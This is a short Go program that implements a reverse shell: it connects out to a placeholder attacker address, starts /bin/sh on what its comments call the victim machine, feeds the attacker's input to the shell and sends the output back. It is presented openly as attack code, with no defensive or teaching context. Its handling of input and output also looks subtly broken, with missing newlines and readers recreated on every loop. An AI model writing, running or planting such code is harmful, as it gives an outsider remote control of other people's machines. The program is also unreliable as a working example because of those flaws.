package main

import (
    "bufio"
    "fmt"
    "net"
    "os/exec"
)

func main() {
    // Connect to the attacker's IP and port
    conn, err := net.Dial("tcp", "attacker_ip:attacker_port")
    if err != nil {
        fmt.Println("Error connecting to attacker:", err)
        return
    }
    defer conn.Close()

    // Create a new command to run on the victim machine
    cmd := exec.Command("/bin/sh")
    stdin, err := cmd.StdinPipe()
    if err != nil {
        fmt.Println("Error creating stdin pipe:", err)
        return
    }
    stdout, err := cmd.StdoutPipe()
    if err != nil {
        fmt.Println("Error creating stdout pipe:", err)
        return
    }
    stderr, err := cmd.StderrPipe()
    if err != nil {
        fmt.Println("Error creating stderr pipe:", err)
        return
    }

    // Start the command
    err = cmd.Start()
    if err != nil {
        fmt.Println("Error starting command:", err)
        return
    }

    // Create a new scanner to read the attacker's input
    scanner := bufio.NewScanner(conn)
    for scanner.Scan() {
        // Write the attacker's input to the command's stdin
        fmt.Fprintf(stdin, scanner.Text())
        // Read the command's stdout and stderr
        output, _ := bufio.NewReader(stdout).ReadString('\n')
        error, _ := bufio.NewReader(stderr).ReadString('\n')
        // Send the output and error to the attacker
        fmt.Fprintf(conn, output+error)
    }
}
